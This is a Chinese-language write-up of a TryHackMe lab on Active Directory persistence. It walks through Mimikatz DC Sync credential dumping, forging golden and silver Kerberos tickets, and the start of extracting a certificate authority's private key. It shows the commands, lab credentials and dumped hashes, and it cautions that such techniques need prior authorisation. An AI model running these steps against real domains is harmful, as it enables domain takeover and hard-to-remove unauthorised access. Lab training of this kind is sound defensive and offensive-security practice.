<p>此凭据对将为您提供对 THMWRK1.za.tryhackme.loc 的 RDP 和 SSH 访问权限。 THMWRK1 可以被视为进入该环境的跳转主机，模拟您已实现的立足点。跳转主机经常成为红队的目标，因为它们提供对新网段的访问。您可以使用 Remmina 或任何其他类似的远程桌面客户端连接到该主机以进行 RDP。连接时记得指定za.tryhackme.loc的域名。</p>
<p>对于 SSH 访问，您可以使用以下 SSH 命令：</p>
<pre><code class="hljs scss">ssh za\\colin<span class="hljs-selector-class">.lane</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc
  // Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: colin.lane <span class="hljs-attribute">Password</span>: Arrangement2012</code></pre>
<p>出现提示时，提供您帐户的关联密码。尽管 RDP 可用于所有任务，但 SSH 速度更快。</p>
<h1 id="0x02-通过凭证进行持久化">0x02 通过凭证进行持久化</h1>
<h2 id="恭喜你">恭喜你</h2>
<p>恭喜疲惫的旅行者！在突破 AD、执行枚举并一路利用它到顶部（如果你按顺序完成了这些 AD 网络）之后，你终于到达了持久性的酒馆。艰苦的工作已经结束，现在是时候享受一些乐趣了。虽然 AD 持久性仍然是一件严肃的事情，但它确实不像其他阶段那么有压力。在这里我们可以尽情发挥我们的创造力。所以，在我们的小酒馆里休息一下您疲惫的骨头，给自己泡一杯好茶，然后我们就开始吧。</p>
<p>连同您的低特权凭据，您将获得域管理员凭据。多么幸运啊！在讨论持久性技术时，您将使用特权凭据对低特权凭据集执行持久性技术。记下以下 DA 帐户：</p>
<pre><code class="hljs scss">Username: `Administrator` 用户名： `Administrator`

Password: `tryhackmewouldnotguess1@` 密码： `tryhackmewouldnotguess1@`

Domain: `ZA` 域： `ZA`</code></pre>
<p>由于我们为您提供对整个域的完全访问权限，因此我们无法真正隐藏任何标志或强迫您确保在回答问题之前自己执行这些持久性技术。不过，我们鼓励您花时间尝试这些方法，因为当蓝队开始将您踢出局时，它们将作为红队评估的回报。</p>
<p>我们将讨论的第一个也是最不可靠的持久性技术是凭证。前面讨论的一些横向技术可能会导致攻击者获得凭证的访问权限。当使用“凭据”一词时，它可能意味着用户名和密码对，但在 AD 上下文中，即使是密码哈希也足以通过哈希传递技术进行身份验证。</p>
<h2 id="dc-sync同步">DC Sync（同步）</h2>
<p>在大型组织中，每个域只有一个域控制器是不够的。这些域通常在多个区域位置使用，并且拥有单个 DC 会显着延迟 AD 中的任何身份验证服务。因此，这些组织使用多个 DC。那么问题就变成了，您如何在两个不同的办公室使用相同的凭据进行身份验证？</p>
<p>这个问题的答案是域复制。每个域控制器都运行一个称为知识一致性检查器 (KCC) 的进程。 KCC为AD林生成复制拓扑，并通过远程过程调用（RPC）自动连接到其他域控制器以同步信息。这包括更新的信息，例如用户的新密码和新对象，例如创建新用户的时间。这就是为什么您在更改密码后通常必须等待几分钟才能进行身份验证，因为发生密码更改的 DC 可能与您进行身份验证的 DC 不同。</p>
<p>复制过程称为 DC 同步。不仅仅是 DC 可以启动复制。属于域管理员组的帐户也可以出于合法目的（例如创建新的域控制器）执行此操作。</p>
<p>一种流行的攻击是 DC 同步攻击。如果我们有权访问具有域复制权限的帐户，我们可以发起 DC 同步攻击以从 DC 获取凭据。</p>
<h2 id="并非所有凭证都是一样的">并非所有凭证都是一样的</h2>
<p>在开始 DC 同步攻击之前，我们首先讨论一下我们可能会寻找哪些凭据。虽然我们应该始终寻求转储特权凭据，例如域管理员组成员的凭据，但这些也是首先要轮换的凭据（蓝队术语，意思是重置帐户密码）。因此，如果我们只有特权凭证，可以肯定地说，一旦蓝队发现我们，他们就会轮换这些帐户，我们可能会失去访问权限。</p>
<p>那么我们的目标就是坚持拥有接近特权的凭证。我们并不总是需要王国的完整钥匙；我们只需要足够的钥匙来确保我们仍然能够实现目标执行并始终让蓝队保持警惕。因此，我们应该尝试通过如下凭证来持久保存：</p>
<ul>
<li>在多台计算机上具有本地管理员权限的凭据。通常，组织有一两个对几乎所有计算机具有本地管理权限的组。这些组通常分为一组用于工作站，一组用于服务器。通过获取这些团体成员的凭据，我们仍然可以访问该庄园中的大部具有委派权限的服务帐户。有了这些账户，我们就能够强制金票和银票执行 Kerberos 委托攻击。</li>
<li>用于特权 AD 服务的帐户。如果我们泄露了特权服务（例如 Exchange、Windows Server Update Services (WSUS) 或 System Center Configuration Manager (SCCM)）的帐户，我们可以利用 AD 漏洞再次获得特权立足点。</li>
</ul>
<p>当谈到要转储和保留哪些凭证时，它受到很多因素的影响。您必须发挥创意并根据具体情况进行思考。然而，对于这个房间，我们将享受一些乐趣，让蓝队流汗，并放弃我们能得到的每一份凭证！</p>
<h2 id="dc同步全部">DC同步全部</h2>
<p>我们将使用 Mimikatz 来获取凭证。使用 DA 帐户通过 SSH 登录 THMWRK1 并加载 Mimikatz：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225161004725.png" alt="image-20240225161004725"></p>
<p>让我们首先对我们自己的单个帐户执行 DC 同步：</p>
<pre><code class="hljs scss">mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /user:louis.cole 
[DC] <span class="hljs-string">'za.tryhackme.loc'</span> will be the domain 
[DC] <span class="hljs-string">'THMDC.za.tryhackme.loc'</span> will be the DC server 
[DC] <span class="hljs-string">'louis.cole'</span> will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>) 

Object RDN           : louis.cole 

** SAM ACCOUNT **

SAM Username         : louis.cole
Account Type         : <span class="hljs-number">30000000</span> ( USER_OBJECT ) 
User Account Control : <span class="hljs-number">00010200</span> ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : <span class="hljs-number">4</span>/<span class="hljs-number">25</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">30</span>:<span class="hljs-number">03</span> PM 
Object Security ID   : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>-<span class="hljs-number">1120</span>
Object Relative ID   : <span class="hljs-number">1120</span>

Credentials:
  Hash NTLM: fbdcd5041c96ddbd82224270b57f11fc 
    ntlm- <span class="hljs-number">0</span>: fbdcd5041c96ddbd82224270b57f11fc
    lm  - <span class="hljs-number">0</span>: d40bfd7d451f6f58d12ff18ccab7e820

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : <span class="hljs-number">474</span>acb706d53bbdb880e1dd75bc4ba8d 

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOClouis.cole 
    Default Iterations : <span class="hljs-number">4096</span>
    Credentials
      aes256_hmac       (<span class="hljs-number">4096</span>) : c069badc39ba1027c18b4833b4c25491f298a79e99eb227d44d0617b84a0b534 
      aes128_hmac       (<span class="hljs-number">4096</span>) : <span class="hljs-number">9</span>b07abcdc3c080f9d0a5cadfe2f6e244
      des_cbc_md5       (<span class="hljs-number">4096</span>) : <span class="hljs-number">408920</span>ec6426da52

* Primary:Kerberos * 
    Default Salt : ZA.TRYHACKME.LOClouis.cole
    Credentials
      des_cbc_md5       : <span class="hljs-number">408920</span>ec6426da52 

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    <span class="hljs-number">01</span>  c9ec818441c8c6df6d1d831a0c6771af
    <span class="hljs-number">02</span>  <span class="hljs-number">4708</span>f92952296eaa3d4b6553309843d6
    <span class="hljs-number">03</span>  <span class="hljs-number">350</span>a3aa15bbab0697e93497f67d83114
    <span class="hljs-number">04</span>  c9ec818441c8c6df6d1d831a0c6771af 
    <span class="hljs-number">05</span>  <span class="hljs-number">4708</span>f92952296eaa3d4b6553309843d6
    <span class="hljs-number">06</span>  a95cc2cd2e9193f72632108e6ff4a361
    <span class="hljs-number">07</span>  c9ec818441c8c6df6d1d831a0c6771af
	.....</code></pre>
<p>您将看到相当多的输出，包括您帐户当前的 NTLM 哈希值。您可以通过使用此类网站将您的密码转换为 NTLM 哈希来验证 NTLM 哈希是否正确。</p>
<p>这很棒，但我们希望 DC 同步每个帐户。为此，我们必须在 Mimikatz 上启用日志记录：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225173127135.png" alt="image-20240225173127135"></p>
<p>确保将<username>更改为您的用户名，以免覆盖其他用户的日志转储。现在，我们将使用 /all 标志，而不是指定我们的帐户：</username></p>
<pre><code class="hljs scss">lsadump::dcsync /domain:za.tryhackme.loc /all</code></pre>
<p>这将需要一些时间才能完成。完成后，退出 Mimikatz 以完成转储查找，然后您可以下载 _dcdump.txt 文件。您可以使用 <code>cat &lt;username&gt;_dcdump.txt | grep "SAM Username"</code> 恢复所有用户名，使用 <code>cat &lt;username&gt;_dcdump.txt | grep "Hash NTLM"</code> 恢复所有哈希值。现在，我们可以执行离线密码破解攻击来恢复纯文本凭证，或者简单地使用 Mimikatz 执行哈希传递攻击。</p>
<pre><code class="hljs scss">scp Administrator<span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.<span class="hljs-attribute">loc</span>:<span class="hljs-attribute">C</span>:/Tools/mimikatz_trunk/x64/hybcx_dcdump.txt .
    //密码:tryhackmewouldnotguess1@</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174655287.png" alt="image-20240225174655287"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240225174648043.png" alt="image-20240225174648043"></p>
<h1 id="0x03-通过票据持久化">0x03 通过票据持久化</h1>
<p>正如前面任务中所讨论的，我们经常希望通过具有委派权限的服务帐户来持久化伪造银票和金票。但这些到底是什么，为什么每次蓝队桌面演习结束时都会有人大喊：“冲掉所有金票和银票！”。</p>
<h2 id="巧克力工厂门票">巧克力工厂门票</h2>
<p>在讨论金票和银票之前，我们首先需要快速回顾一下 Kerberos 身份验证。下图显示了 Kerberos 身份验证的正常流程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226163153951.png" alt="image-20240226163153951"></p>
<p>用户在 DC 上向密钥分发中心（KDC）发出 AS-REQ 请求，其中包括使用用户的 NTLM 散列加密的时间戳。本质上，这是请求一个票据授予票据（TGT）。DC 检查信息并将 TGT 发送给用户。这个 TGT 使用仅存储在 DC 上的 KRBTGT 帐户的密码哈希进行签名。现在，用户可以将这个 TGT 发送给 DC，以请求对用户想要访问的资源的票据授予服务（TGS）。如果 TGT 检查通过，DC 将响应 TGS，该 TGS 使用用户请求访问的服务的 NTLM 散列加密。然后用户将这个 TGS 提交给服务进行访问，服务可以验证 TGS，因为它知道自己的散列并可以授予用户访问权限。</p>
<p>说了所有这些背景理论后，是时候研究一下金票和银票了。</p>
<h2 id="黄金票据">黄金票据</h2>
<p>金票是伪造的 TGT。这意味着我们绕过上图中的步骤 1 和 2，向 DC 证明我们是谁。拥有特权帐户的有效 TGT，我们现在可以为几乎任何我们想要的服务请求 TGS。为了伪造金票，我们需要 KRBTGT 帐户的密码哈希，以便我们可以为我们想要的任何用户帐户签署 TGT。关于金票的一些有趣的说明：</p>
<ul>
<li>
<p>通过在 Kerberos 进程的此阶段进行注入，我们不需要要模拟的帐户的密码哈希，因为我们绕过了该步骤。 TGT仅用于证明DC上的KDC对其进行了签名。由于它是由 KRBTGT 哈希签名的，因此该验证通过，并且无论其内容如何，​​TGT 都被声明为有效。</p>
</li>
<li>
<p>说到内容，KDC 只会验证 TGT 中指定的用户帐户（如果该帐户早于 20 分钟）。这意味着我们可以将禁用、删除或不存在的帐户放入 TGT，只要我们确保时间戳不超过 20 分钟，它就有效。</p>
</li>
<li>
<p>由于票证的策略和规则是在 TGT 本身中设置的，因此我们可以覆盖 KDC 推送的值，例如票证只能在 10 小时内有效。例如，我们可以确保我们的 TGT 有效期为 10 年，从而赋予我们持久性。</p>
</li>
<li>
<p>默认情况下，KRBTGT 帐户的密码永远不会更改，这意味着一旦我们拥有密码，除非手动轮换，否则我们可以通过永久生成 TGT 来获得持久访问权限。</p>
</li>
<li>
<p>蓝队必须将 KRBTGT 帐户的密码轮换两次，因为当前密码和以前的密码对该帐户仍然有效。这是为了确保密码的意外轮换不会影响服务。</p>
</li>
<li>
<p>轮换 KRBTGT 帐户的密码对于蓝队来说是一项非常痛苦的过程，因为这将导致环境中的大量服务停止工作。他们可能认为自己拥有一个有效的 TGT，有时甚至会持续几个小时，但那个 TGT 已经失效了。并非所有的服务都足够智能，能够在 TGT 失效后释放它（因为时间戳仍然有效），因此它们不会自动请求一个新的 TGT。</p>
</li>
<li>
<p>黄金票据甚至可以让您绕过智能卡验证，因为在创建 TGT 之前，智能卡是由 DC 验证的。</p>
</li>
</ul>
<p>除了 KRBTGT 帐户的密码哈希之外，我们只需要域名、域 SID 和我们想要模拟的人的用户 ID。如果我们处于可以恢复 KRBTGT 帐户密码哈希的位置，那么我们已经处于可以恢复其他所需信息的位置了。</p>
<h2 id="白银票据">白银票据</h2>
<p>银票是伪造的 TGS 票。因此，现在，我们跳过与 DC 上的 K DC 进行的所有通信（上图中的步骤 1-4），而只与我们想要直接访问的服务进行交互。关于银票的一些有趣的说明：</p>
<ul>
<li>
<p>生成的 TGS 由我们目标主机的机器帐户签名。</p>
</li>
<li>
<p>金票和银票之间的主要区别在于我们获得的特权数量。如果我们拥有 KRBTGT 帐户的密码哈希值，我们就可以访问所有内容。使用银票，由于我们只能访问我们正在攻击的服务器的计算机帐户的密码哈希，因此我们只能模拟该主机本身的用户。银票的范围仅限于特定服务器上的任何服务。</p>
</li>
<li>
<p>由于 TGS 是伪造的，所以没有关联的 TGT，这意味着 DC 从未被联系过。这使得攻击非常危险，因为唯一可用的日志将在目标服务器上。因此，虽然范围更有限，但对于蓝队来说，检测起来要困难得多。</p>
</li>
<li>
<p>由于权限是通过 SID 确定的，因此我们可以再次为银票证创建一个不存在的用户，只要我们确保该票证具有将用户置于主机的本地管理员组中的相关 SID。</p>
</li>
<li>
<p>机器帐户的密码通常每 30 天轮换一次，这不利于持久性。但是，我们可以利用 TGS 提供的访问权限来访问主机注册表并更改负责机器帐户密码轮换的参数。从而确保机器帐户保持静态并授予我们在机器上的持久性。</p>
</li>
<li>
<p>虽然只能访问单个主机可能看起来是一个显著的降级，但机器帐户可以像普通的AD帐户一样使用，不仅允许您对主机进行管理员访问，还可以继续像使用AD用户帐户一样枚举和利用AD。</p>
</li>
</ul>
<h2 id="伪造门票以获取乐趣和利润">伪造门票以获取乐趣和利润</h2>
<p>现在我们已经解释了金票和银票的基础知识，让我们生成一些。您将需要 KRBTGT 帐户的 NTLM 哈希值，由于在上一个任务中执行了 DC 同步，您现在应该拥有该哈希值。此外，记下与 THMSERVER1 计算机帐户关联的 NTLM 哈希值，因为我们需要这个哈希值作为银票。您可以在执行的 DC 转储中找到此信息。我们需要的最后一条信息是域 SID。使用 THMWRK1 上的低特权 SSH 终端，我们可以使用 AD-RSAT cmdlet 来恢复此信息：</p>
<pre><code class="hljs scss">ssh za\\phillip<span class="hljs-selector-class">.wilkins</span><span class="hljs-keyword">@thmwrk</span>1.za.tryhackme.loc &nbsp;
 //Your credentials have been <span class="hljs-attribute">generated</span>: <span class="hljs-attribute">Username</span>: phillip.wilkins <span class="hljs-attribute">Password</span>: Developmental1971</code></pre>
<p>输入以下命令获取到相关信息</p>
<pre><code class="hljs scss">PS C:\Users\phillip.wilkins&gt; Get-ADDomain 


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=loc       
DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=loc 
DistinguishedName                  : DC=za,DC=tryhackme,DC=loc
DNSRoot                            : za.tryhackme.loc
DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DomainMode                         : Windows2012R2Domain
DomainSID                          : S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span>
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=za,DC=tryhackme,DC=loc
Forest                             : tryhackme.loc
InfrastructureMaster               : THMDC.za.tryhackme.loc
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={<span class="hljs-number">31</span>B2F340-<span class="hljs-number">016</span>D-<span class="hljs-number">11</span>D2-<span class="hljs-number">945</span>F-<span class="hljs-number">00</span>C04FB984F9},CN=Policies,CN=System,DC=za,DC=tryhackme,DC=loc}
LostAndFoundContainer              : CN=LostAndFound,DC=za,DC=tryhackme,DC=loc
ManagedBy                          :
Name                               : za
NetBIOSName                        : ZA
ObjectClass                        : domainDNS
ObjectGUID                         : <span class="hljs-number">1</span>fc9e299-da51-<span class="hljs-number">4</span>d03-baa0-<span class="hljs-number">862</span>c3360c0b2
ParentDomain                       : tryhackme.loc
PDCEmulator                        : THMDC.za.tryhackme.loc
PublicKeyRequiredPasswordRolling   :
QuotasContainer                    : CN=NTDS Quotas,DC=za,DC=tryhackme,DC=loc
ReadOnlyReplicaDirectoryServers    : {} 
ReplicaDirectoryServers            : {THMDC<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>}
RIDMaster                          : THMDC.za.tryhackme.loc
SubordinateReferences              : {DC=DomainDnsZones,DC=za,DC=tryhackme,DC=loc}
SystemsContainer                   : CN=System,DC=za,DC=tryhackme,DC=loc
UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=loc</code></pre>
<p>现在我们已经拥有了所有必需的信息，我们可以重新启动 Mimikatz：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164724770.png" alt="image-20240226164724770"></p>
<p>加载 Mimikatz 后，执行以下操作以生成黄金票证：</p>
<pre><code class="hljs scss">kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:<span class="hljs-number">500</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> /krbtgt:<span class="hljs-number">16</span>f9af38fca3ada405386b3b57366082 /endin:<span class="hljs-number">600</span> /renewmax:<span class="hljs-number">10080</span> /ptt</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226164909614.png" alt="image-20240226164909614"></p>
<p>参数解释：</p>
<ul>
<li>/admin - 我们要模拟的用户名。这不必是有效用户。</li>
<li>/domain - 我们要为其生成票证的域的 FQDN。</li>
<li>/id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。</li>
<li>/sid - 我们要为其生成票证的域的 SID。</li>
<li>/krbtgt - KRBTGT 帐户的 NTLM 哈希值。</li>
<li>/endin - 票证有效期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是10小时（600分钟）</li>
<li>/renewmax - 续订的最长票证生命周期。默认情况下，Mimikatz 生成一张有效期为 10 年的票证。 AD默认的Kerberos策略是7天（10080分钟）</li>
<li>/ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>我们可以通过对域控制器运行 dir 命令来验证黄金票证是否正常工作：</p>
<pre><code class="hljs scss">dir \\thmdc<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\c$\</code></pre>
<p>在这里我又另起了一个ssh会话，接着输入以上命令发现没有权限</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165532727.png" alt="image-20240226165532727"></p>
<p>接着我在原ssh上试了试发现成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226165555756.png" alt="image-20240226165555756"></p>
<p>即使黄金票据的有效期非常长，蓝队仍然可以通过简单地两次轮换 KRBTGT 密码来防御。如果我们真的想深入了解，我们希望生成白银票据，这些票据不太可能被发现，并且更难以防御，因为必须轮换每个机器帐户的密码。我们可以使用以下 Mimikatz 命令来生成白银票据：</p>
<pre><code class="hljs scss">kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:<span class="hljs-number">500</span> /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3885271727</span>-<span class="hljs-number">2693558621</span>-<span class="hljs-number">2658995185</span> /target:THMSERVER1.za.tryhackme.loc /rc4:<span class="hljs-number">4</span>c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt</code></pre>
<p>参数解释：</p>
<ul>
<li>/admin - 我们要模拟的用户名。这不必是有效用户。</li>
<li>/domain - 我们要为其生成票证的域的 FQDN。</li>
<li>/id - 用户 RID。默认情况下，Mimikatz 使用 RID 500，这是默认的管理员帐户 RID。</li>
<li>/sid - 我们要为其生成票证的域的 SID。</li>
<li>/target - 我们的目标服务器的主机名。让我们做 THMSERVER1.za.tryhackme.loc，但它可以是任何加入域的主机。</li>
<li>/rc4 - 我们的目标计算机帐户的 NTLM 哈希值。查看 DC 同步结果以查找 THMSERVER1$ 的 NTLM 哈希值。 $ 表示它是一个机器帐户。</li>
<li>/service - 我们在 TGS 中请求的服务。 CIFS 是一个安全的选择，因为它允许文件访问。</li>
<li>/ptt - 该标志告诉 Mimikatz 将票证直接注入会话中，这意味着它已准备好使用。</li>
</ul>
<p>我们可以通过对 THMSERVER1 运行 dir 命令来验证银票是否正常工作：</p>
<pre><code class="hljs scss">dir \\thmserver1<span class="hljs-selector-class">.za</span><span class="hljs-selector-class">.tryhackme</span><span class="hljs-selector-class">.loc</span>\c$\</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170201849.png" alt="image-20240226170201849"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226170443201.png" alt="image-20240226170443201"></p>
<h1 id="0x04-通过证书进行持久化">0x04 通过证书进行持久化</h1>
<p><strong>这里有一个快速说明。从现在开始讨论的技术具有令人难以置信的侵入性并且难以消除。即使您已批准红队练习来执行这些技术，您在执行这些技术时也必须格外小心。在现实场景中，利用大多数这些技术将导致完整的域重建。确保您完全了解使用这些技术的后果，并且仅在您的评估事先获得批准并且认为有必要时才执行这些技术。在大多数情况下，红队演习此时将被取消，而不是使用这些技术。这意味着您很可能不会执行这些持久性技术，而是模拟它们。</strong></p>
<p>最后两种持久性技术依赖于凭据。虽然我们肯定可以让蓝队的生活变得复杂，但他们最终可以轮换足够的凭据来将我们踢出去。因此，虽然这些技术在让蓝队忙碌的同时保持着它们的忙碌很好，但我们应该寻找使用不依赖凭据的持久性技术，这意味着这些凭据的轮换不会将我们踢出去。我们将首先看看的是证书。</p>
<h2 id="ad-cs回归">AD CS回归</h2>
<p>在利用 AD 室中，我们利用证书成为域管理员。但是，证书也可用于持久性。我们所需要的只是一个可用于客户端身份验证的有效证书。这将允许我们使用证书来请求 TGT。这有什么美感？我们可以继续请求 TGT，无论他们在我们攻击的账户上进行了多少轮换。我们被踢出的唯一方法是他们撤销我们生成的证书或者证书过期。这意味着我们可能在接下来的大约 5 年里默认拥有持久访问权限。</p>
<p>如果您有兴趣了解有关请求证书并将其用于 Kerberos 身份验证的最新信息，请转到利用 AD 或 AD 证书模板室。然而，在这个房间里，我们并没有闲逛。我们正在追查证书颁发机构 (CA) 本身。</p>
<p>根据我们的访问权限，我们可以再进一步。我们可以简单地窃取根 CA 证书的私钥，以便在任何时候生成我们自己的证书。更糟糕的是，由于这些证书从未被 CA 颁发，因此蓝队无法撤销它们。对于蓝队来说，这将是更糟糕的情况，因为这意味着CA的轮换，这意味着蓝队必须撤销所有已经颁发的证书才能将我们踢出去。想象一下，你刚刚花了两天的时间执行了域接管，轮换了每个特权帐户的凭据，重置了所有的黄金和白银票据，只是为了意识到攻击者通过成为你的 CA 而持续存在。糟糕！</p>
<h2 id="提取私钥">提取私钥</h2>
<p>CA的私钥存储在CA服务器本身上。如果私钥未通过基于硬件的保护方法（例如硬件安全模块 (HSM)）进行保护（对于仅将 Active Directory 证书服务 (AD CS) 用于内部目的的组织来说通常是这种情况），则它会受到机器数据保护 API (DPAPI)。这意味着我们可以使用 Mimikatz 和 SharpDPAPI 等工具来提取 CA 证书，从而从 CA 中提取私钥。 Mimikatz 是使用最简单的工具，但如果您想体验其他工具，请看看<a target="_blank" rel="noopener" href="https://pentestlab.blog/2021/11/15/golden-certificate/">这里</a>。使用任务 2 中的管理员凭据使用 SSH 对 THMDC.za.tryhackme.loc 进行身份验证，为您的用户创建一个唯一的目录，移至该目录并加载 Mimikatz：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240226172020599.png" alt="image-20240226172020599"></p>
<p>我们先看看能否查看到DC上存储的证书：</p>
<pre><code class="hljs scss">mimikatz # crypto::certificates /systemstore:local_machine 
 * System Store  : <span class="hljs-string">'local_machine'</span> (<span class="hljs-number">0</span>x00020000) 
 * Store         : <span class="hljs-string">'My'</span>

 <span class="hljs-number">0</span>.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : <span class="hljs-number">040000000000703</span>a4d78090a0ab10400000010 
    Algorithm: <span class="hljs-number">1.2</span>.<span class="hljs-number">840.113549</span>.<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span> (RSA)
    Validity : <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2022</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM -&gt; <span class="hljs-number">4</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2023</span> <span class="hljs-number">7</span>:<span class="hljs-number">32</span>:<span class="hljs-number">43</span> PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider 
        Provider type  : RSA_SCHANNEL (<span class="hljs-number">12</span>)
        Type           : AT_KEYEXCHANGE (<span class="hljs-number">0</span>x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-<span class="hljs-number">5</span>ed52c94-<span class="hljs-number">34</span>e8-<span class="hljs-number">4450</span>-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-<span class="hljs-number">2</span>d6f-<span class="hljs-number">4</span>ad7-a061-b862ac75bcb1 
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : <span class="hljs-number">2048</span> (<span class="hljs-number">0</span>x00000800)
        Key permissions: <span class="hljs-number">0000003</span>b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO

 <span class="hljs-number">1</span>. za-THMDC-CA
